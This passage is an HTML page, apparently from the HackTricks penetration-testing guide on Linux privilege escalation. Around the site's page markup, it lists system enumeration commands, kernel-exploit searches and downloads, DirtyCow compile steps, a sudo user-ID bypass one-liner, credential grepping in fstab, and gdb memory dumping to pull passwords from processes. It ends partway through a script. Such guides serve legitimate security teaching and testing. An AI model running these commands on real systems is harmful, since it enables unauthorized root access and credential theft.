@@ -1,0 +1,1577 @@
+<!DOCTYPE HTML>
+<html lang="en" class="hacktricks-light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Linux Privilege Escalation - HackTricks</title>
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../theme/tabs.css">
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var lang = "en";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "hacktricks-dark" : "hacktricks-light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('hacktricks-light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            var body = document.querySelector("body");
+            if (document.body.clientWidth >= 550) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+            <div id="search-wrapper" class="hidden">
+                <div id="search-modal">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <span class="fa fa-search"></span>
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="menu-bar-container">
+                        <div class="left-buttons">
+                            <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                                <i class="fa fa-bars"></i>
+                            </label>
+                            <a href="/">
+                                <h1 class="menu-title"><img src="../../../../../images/CLOUD-web-logo.png" alt="" style="width:auto;height:30px;vertical-align:middle;margin-right:5px;">HackTricks</h1>
+                            </a>
+
+                        </div>
+
+
+                        <div class="right-buttons">
+                            <div id="menubar-collapse">
+                                <a class="menu-bar-link" href="https://training.hacktricks.xyz" target="_blank">
+                                    Hacktricks Training
+                                </a>
+                                <a class="menu-bar-link" href="https://twitter.com/hacktricks_live" target="_blank">
+                                    Twitter
+                                </a>
+                                <a class="menu-bar-link" href="https://www.linkedin.com/company/hacktricks" target="_blank">
+                                    Linkedin
+                                </a>
+                                <a class="menu-bar-link" href="https://github.com/sponsors/carlospolop" target="_blank">
+                                    Sponsor
+                                </a>
+                            </div>
+                            <div class="icons">
+                                <div id="menubar-collapse-toggle" class="icon-button" type="button" title="Toggle menu bar" aria-label="Toggle Menu bar" aria-expanded="false" aria-controls="collapse">
+                                    <i class="fa fa-ellipsis-h"></i>
+                                    <div id="menubar-collapse-popup" class="menubar-collapse-popup" aria-label="Menu" role="menu">
+                                        <a href="https://training.hacktricks.xyz" target="_blank" role="menuitem" class="menu-bar-link">Hacktricks Training</a>
+                                        <a href="https://twitter.com/hacktricks_live" target="_blank" role="menuitem" class="menu-bar-link">Twitter</a>
+                                        <a href="https://www.linkedin.com/company/hacktricks" target="_blank" role="menuitem" class="menu-bar-link">Linkedin</a>
+                                        <a href="https://github.com/sponsors/carlospolop" target="_blank" role="menuitem" class="menu-bar-link">Sponsor</a>
+                                    </div>
+                                </div>
+
+                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                                    <i class="fa fa-search"></i>
+                                </button>
+
+                                <div id="menubar-languages-toggle" class="icon-button" type="button" title="Translations" aria-label="Toggle Tanslations" aria-expanded="false" aria-controls="translations">
+                                    <i class="fa fa-globe"></i>
+                                    <span class="menu-bar-link">Translations</span>
+                                    
+                                    <div id="menubar-languages-popup" class="menubar-languages-popup" aria-label="Language menu" role="language menu">
+                                        <button id="af" role="menuitem" class="menu-bar-link">Afrikaans</button>
+                                        <button id="zh" role="menuitem" class="menu-bar-link">Chinese</button>
+                                        <button id="en" role="menuitem" class="menu-bar-link">English</button>
+                                        <button id="fr" role="menuitem" class="menu-bar-link">French</button>
+                                        <button id="de" role="menuitem" class="menu-bar-link">German</button>
+                                        <button id="el" role="menuitem" class="menu-bar-link">Greek</button>
+                                        <button id="hi" role="menuitem" class="menu-bar-link">Hindi</button>
+                                        <button id="it" role="menuitem" class="menu-bar-link">Italian</button>
+                                        <button id="ja" role="menuitem" class="menu-bar-link">Japanese</button>
+                                        <button id="ko" role="menuitem" class="menu-bar-link">Korean</button>
+                                        <button id="pl" role="menuitem" class="menu-bar-link">Polish</button>
+                                        <button id="pt" role="menuitem" class="menu-bar-link">Portuguese</button>
+                                        <button id="sr" role="menuitem" class="menu-bar-link">Serbian</button>
+                                        <button id="es" role="menuitem" class="menu-bar-link">Spanish</button>
+                                        <button id="sw" role="menuitem" class="menu-bar-link">Swahili</button>
+                                        <button id="tr" role="menuitem" class="menu-bar-link">Turkish</button>
+                                        <button id="uk" role="menuitem" class="menu-bar-link">Ukrainian</button>
+                                    </div>
+                                </div>
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+                <div id="container" class="container">
+                    <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+                        <!-- populated by js -->
+                        <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+                        <noscript>
+                            <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+                        </noscript>
+                    </nav>
+                    <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                    <script>
+                        document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                        document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                        Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                            link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                        });
+                    </script>
+
+                    <div id="content" class="content">
+                        <main>
+                            <div class="mobilesponsor-wrapper">
+
+                            <a class="mobilesponsor" href="" target="_blank">
+                                <img src="" alt="" srcset="">
+                                <div class="mobilesponsor-title">
+                                </div>
+                                <div class="mobilesponsor-description">
+                                </div>
+                                <div class="mobilesponsor-cta"></div>
+                            </a>
+                            </div>
+                            <style>
+.mdbook-alerts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-left: 0.25em solid var(--mdbook-alerts-color);
+}
+
+.mdbook-alerts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-alerts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-alerts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-alerts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-alerts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-alerts-icon);
+  mask-image: var(--mdbook-alerts-icon);
+}
+
+.mdbook-alerts-note {
+  --mdbook-alerts-color: rgb(9, 105, 218);
+  /* https://icon-sets.iconify.design/material-symbols/info-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 17q.425 0 .713-.288T13 16v-4q0-.425-.288-.712T12 11q-.425 0-.712.288T11 12v4q0 .425.288.713T12 17m0-8q.425 0 .713-.288T13 8q0-.425-.288-.712T12 7q-.425 0-.712.288T11 8q0 .425.288.713T12 9m0 13q-2.075 0-3.9-.788t-3.175-2.137q-1.35-1.35-2.137-3.175T2 12q0-2.075.788-3.9t2.137-3.175q1.35-1.35 3.175-2.137T12 2q2.075 0 3.9.788t3.175 2.137q1.35 1.35 2.138 3.175T22 12q0 2.075-.788 3.9t-2.137 3.175q-1.35 1.35-3.175 2.138T12 22m0-2q3.35 0 5.675-2.325T20 12q0-3.35-2.325-5.675T12 4Q8.65 4 6.325 6.325T4 12q0 3.35 2.325 5.675T12 20m0-8"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-tip {
+  --mdbook-alerts-color: rgb(26, 127, 55);
+  /* https://icon-sets.iconify.design/material-symbols/lightbulb-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 22q-.825 0-1.412-.587T10 20h4q0 .825-.587 1.413T12 22m-3-3q-.425 0-.712-.288T8 18q0-.425.288-.712T9 17h6q.425 0 .713.288T16 18q0 .425-.288.713T15 19zm-.75-3q-1.725-1.025-2.738-2.75T4.5 9.5q0-3.125 2.188-5.312T12 2q3.125 0 5.313 2.188T19.5 9.5q0 2.025-1.012 3.75T15.75 16zm.6-2h6.3q1.125-.8 1.738-1.975T17.5 9.5q0-2.3-1.6-3.9T12 4Q9.7 4 8.1 5.6T6.5 9.5q0 1.35.613 2.525T8.85 14M12 14"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-important {
+  --mdbook-alerts-color: rgb(130, 80, 223);
+  /* https://icon-sets.iconify.design/material-symbols/chat-info-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 7q.425 0 .713-.288T13 6q0-.425-.288-.712T12 5q-.425 0-.712.288T11 6q0 .425.288.713T12 7m0 8q.425 0 .713-.288T13 14v-4q0-.425-.288-.712T12 9q-.425 0-.712.288T11 10v4q0 .425.288.713T12 15m-6 3l-2.3 2.3q-.475.475-1.088.213T2 19.575V4q0-.825.588-1.412T4 2h16q.825 0 1.413.588T22 4v12q0 .825-.587 1.413T20 18zm-.85-2H20V4H4v13.125zM4 16V4z"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-warning {
+  --mdbook-alerts-color: rgb(154, 103, 0);
+  /* https://icon-sets.iconify.design/material-symbols/warning-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M2.725 21q-.275 0-.5-.137t-.35-.363q-.125-.225-.137-.488t.137-.512l9.25-16q.15-.25.388-.375T12 3q.25 0 .488.125t.387.375l9.25 16q.15.25.138.513t-.138.487q-.125.225-.35.363t-.5.137zm1.725-2h15.1L12 6zM12 18q.425 0 .713-.288T13 17q0-.425-.288-.712T12 16q-.425 0-.712.288T11 17q0 .425.288.713T12 18m0-3q.425 0 .713-.288T13 14v-3q0-.425-.288-.712T12 10q-.425 0-.712.288T11 11v3q0 .425.288.713T12 15m0-2.5"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-caution {
+  --mdbook-alerts-color: rgb(207, 34, 46);
+  /* https://icon-sets.iconify.design/material-symbols/brightness-alert-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 17q.425 0 .713-.288T13 16q0-.425-.288-.712T12 15q-.425 0-.712.288T11 16q0 .425.288.713T12 17m0-4q.425 0 .713-.288T13 12V8q0-.425-.288-.712T12 7q-.425 0-.712.288T11 8v4q0 .425.288.713T12 13m-3.35 7H6q-.825 0-1.412-.587T4 18v-2.65L2.075 13.4q-.275-.3-.425-.662T1.5 12q0-.375.15-.737t.425-.663L4 8.65V6q0-.825.588-1.412T6 4h2.65l1.95-1.925q.3-.275.663-.425T12 1.5q.375 0 .738.15t.662.425L15.35 4H18q.825 0 1.413.588T20 6v2.65l1.925 1.95q.275.3.425.663t.15.737q0 .375-.15.738t-.425.662L20 15.35V18q0 .825-.587 1.413T18 20h-2.65l-1.95 1.925q-.3.275-.662.425T12 22.5q-.375 0-.737-.15t-.663-.425zm.85-2l2.5 2.5l2.5-2.5H18v-3.5l2.5-2.5L18 9.5V6h-3.5L12 3.5L9.5 6H6v3.5L3.5 12L6 14.5V18zm2.5-6"%2F%3E%3C%2Fsvg%3E');
+}
+
+</style>
+<style>
+div.codeblock_filename_container + pre {
+  margin-top: 0;
+}
+
+span.codeblock_filename_inner {
+  border-radius: 0.4rem 0.4rem 0 0;
+  padding: 0.6rem 1rem 0.6rem 1rem;
+  font-family: var(--mono-font) !important;
+  font-size: var(--code-font-size);
+}
+
+</style>
+<h1 id="linux-privilege-escalation"><a class="header" href="#linux-privilege-escalation">Linux Privilege Escalation</a></h1>
+<p>Reading time: 58 minutes</p>
+<div class="mdbook-alerts mdbook-alerts-tip">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  tip
+</p>
+<p>Learn &amp; practice AWS Hacking:<img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><br />
+Learn &amp; practice GCP Hacking: <img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</div>
+<h2 id="system-information"><a class="header" href="#system-information">System Information</a></h2>
+<h3 id="os-info"><a class="header" href="#os-info">OS info</a></h3>
+<p>Let's start gaining some knowledge of the OS running</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(cat /proc/version || uname -a ) 2&gt;/dev/null
+lsb_release -a 2&gt;/dev/null # old, not by default on many systems
+cat /etc/os-release 2&gt;/dev/null # universal on modern systems
+</code></pre>
+<h3 id="path"><a class="header" href="#path">Path</a></h3>
+<p>If you <strong>have write permissions on any folder inside the <code>PATH</code></strong> variable you may be able to hijack some libraries or binaries:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">echo $PATH
+</code></pre>
+<h3 id="env-info"><a class="header" href="#env-info">Env info</a></h3>
+<p>Interesting information, passwords or API keys in the environment variables?</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(env || set) 2&gt;/dev/null
+</code></pre>
+<h3 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel exploits</a></h3>
+<p>Check the kernel version and if there is some exploit that can be used to escalate privileges</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cat /proc/version
+uname -a
+searchsploit "Linux Kernel"
+</code></pre>
+<p>You can find a good vulnerable kernel list and some already <strong>compiled exploits</strong> here: <a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a> and <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">exploitdb sploits</a>.<br />
+Other sites where you can find some <strong>compiled exploits</strong>: <a href="https://github.com/bwbwbwbw/linux-exploit-binaries">https://github.com/bwbwbwbw/linux-exploit-binaries</a>, <a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack</a></p>
+<p>To extract all the vulnerable kernel versions from that web you can do:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2&gt;/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "&lt;" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
+</code></pre>
+<p>Tools that could help to search for kernel exploits are:</p>
+<p><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester.sh</a><br />
+<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2.pl</a><br />
+<a href="http://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker.py</a> (execute IN victim,only checks exploits for kernel 2.x)</p>
+<p>Always <strong>search the kernel version in Google</strong>, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.</p>
+<h3 id="cve-2016-5195-dirtycow"><a class="header" href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></h3>
+<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># make dirtycow stable
+echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+</code></pre>
+<h3 id="sudo-version"><a class="header" href="#sudo-version">Sudo version</a></h3>
+<p>Based on the vulnerable sudo versions that appear in:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">searchsploit sudo
+</code></pre>
+<p>You can check if the sudo version is vulnerable using this grep.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+</code></pre>
+<h4 id="sudo--v128"><a class="header" href="#sudo--v128">sudo &lt; v1.28</a></h4>
+<p>From @sickrov</p>
+<pre><code>sudo -u#-1 /bin/bash
+</code></pre>
+<h3 id="dmesg-signature-verification-failed"><a class="header" href="#dmesg-signature-verification-failed">Dmesg signature verification failed</a></h3>
+<p>Check <strong>smasher2 box of HTB</strong> for an <strong>example</strong> of how this vuln could be exploited</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">dmesg 2&gt;/dev/null | grep "signature"
+</code></pre>
+<h3 id="more-system-enumeration"><a class="header" href="#more-system-enumeration">More system enumeration</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">date 2&gt;/dev/null #Date
+(df -h || lsblk) #System stats
+lscpu #CPU info
+lpstat -a 2&gt;/dev/null #Printers info
+</code></pre>
+<h2 id="enumerate-possible-defenses"><a class="header" href="#enumerate-possible-defenses">Enumerate possible defenses</a></h2>
+<h3 id="apparmor"><a class="header" href="#apparmor">AppArmor</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">if [ `which aa-status 2&gt;/dev/null` ]; then
+    aa-status
+  elif [ `which apparmor_status 2&gt;/dev/null` ]; then
+    apparmor_status
+  elif [ `ls -d /etc/apparmor* 2&gt;/dev/null` ]; then
+    ls -d /etc/apparmor*
+  else
+    echo "Not found AppArmor"
+fi
+</code></pre>
+<h3 id="grsecurity"><a class="header" href="#grsecurity">Grsecurity</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">((uname -r | grep "\-grsec" &gt;/dev/null 2&gt;&amp;1 || grep "grsecurity" /etc/sysctl.conf &gt;/dev/null 2&gt;&amp;1) &amp;&amp; echo "Yes" || echo "Not found grsecurity")
+</code></pre>
+<h3 id="pax"><a class="header" href="#pax">PaX</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(which paxctl-ng paxctl &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "Yes" || echo "Not found PaX")
+</code></pre>
+<h3 id="execshield"><a class="header" href="#execshield">Execshield</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
+</code></pre>
+<h3 id="selinux"><a class="header" href="#selinux">SElinux</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"> (sestatus 2&gt;/dev/null || echo "Not found sestatus")
+</code></pre>
+<h3 id="aslr"><a class="header" href="#aslr">ASLR</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space 2&gt;/dev/null
+#If 0, not enabled
+</code></pre>
+<h2 id="docker-breakout"><a class="header" href="#docker-breakout">Docker Breakout</a></h2>
+<p>If you are inside a docker container you can try to escape from it:</p>
+<p><a class="content_ref" href="docker-security/index.html"><span class="content_ref_label">Docker Security</span></a></p>
+<h2 id="drives"><a class="header" href="#drives">Drives</a></h2>
+<p>Check <strong>what is mounted and unmounted</strong>, where and why. If anything is unmounted you could try to mount it and check for private info</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ls /dev 2&gt;/dev/null | grep -i "sd"
+cat /etc/fstab 2&gt;/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null
+#Check if credentials in fstab
+grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2&gt;/dev/null
+</code></pre>
+<h2 id="useful-software"><a class="header" href="#useful-software">Useful software</a></h2>
+<p>Enumerate useful binaries</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null
+</code></pre>
+<p>Also, check if <strong>any compiler is installed</strong>. This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar)</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(dpkg --list 2&gt;/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2&gt;/dev/null || yum list installed 'gcc*' 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r "/gcc[0-9\.-]\+$" 2&gt;/dev/null | grep -v "/doc/")
+</code></pre>
+<h3 id="vulnerable-software-installed"><a class="header" href="#vulnerable-software-installed">Vulnerable Software Installed</a></h3>
+<p>Check for the <strong>version of the installed packages and services</strong>. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges…<br />
+It is recommended to check manually the version of the more suspicious installed software.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">dpkg -l #Debian
+rpm -qa #Centos
+</code></pre>
+<p>If you have SSH access to the machine you could also use <strong>openVAS</strong> to check for outdated and vulnerable software installed inside the machine.</p>
+<blockquote>
+<p>[!NOTE] &gt; <em>Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits</em></p>
+</blockquote>
+<h2 id="processes"><a class="header" href="#processes">Processes</a></h2>
+<p>Take a look at <strong>what processes</strong> are being executed and check if any process has <strong>more privileges than it should</strong> (maybe a tomcat being executed by root?)</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ps aux
+ps -ef
+top -n 1
+</code></pre>
+<p>Always check for possible <a href="electron-cef-chromium-debugger-abuse.html"><strong>electron/cef/chromium debuggers</strong> running, you could abuse it to escalate privileges</a>. <strong>Linpeas</strong> detect those by checking the <code>--inspect</code> parameter inside the command line of the process.<br />
+Also <strong>check your privileges over the processes binaries</strong>, maybe you can overwrite someone.</p>
+<h3 id="process-monitoring"><a class="header" href="#process-monitoring">Process monitoring</a></h3>
+<p>You can use tools like <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.</p>
+<h3 id="process-memory"><a class="header" href="#process-memory">Process memory</a></h3>
+<p>Some services of a server save <strong>credentials in clear text inside the memory</strong>.<br />
+Normally you will need <strong>root privileges</strong> to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.<br />
+However, remember that <strong>as a regular user you can read the memory of the processes you own</strong>.</p>
+<div class="mdbook-alerts mdbook-alerts-warning">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  warning
+</p>
+<p>Note that nowadays most machines <strong>don't allow ptrace by default</strong> which means that you cannot dump other processes that belong to your unprivileged user.</p>
+<p>The file <em><strong>/proc/sys/kernel/yama/ptrace_scope</strong></em> controls the accessibility of ptrace:</p>
+<ul>
+<li><strong>kernel.yama.ptrace_scope = 0</strong>: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.</li>
+<li><strong>kernel.yama.ptrace_scope = 1</strong>: only a parent process can be debugged.</li>
+<li><strong>kernel.yama.ptrace_scope = 2</strong>: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.</li>
+<li><strong>kernel.yama.ptrace_scope = 3</strong>: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.</li>
+</ul>
+</div>
+<h4 id="gdb"><a class="header" href="#gdb">GDB</a></h4>
+<p>If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">gdb -p &lt;FTP_PROCESS_PID&gt;
+(gdb) info proc mappings
+(gdb) q
+(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;
+(gdb) q
+strings /tmp/mem_ftp #User and password
+</code></pre>
+<h4 id="gdb-script"><a class="header" href="#gdb-script">GDB Script</a></h4>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">dump-memory.sh</span></div>
+<pre><code class="language-bash">#!/bin/bash
+#./dump-memory.sh &lt;PID&gt;
+grep rw-p /proc/$1/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
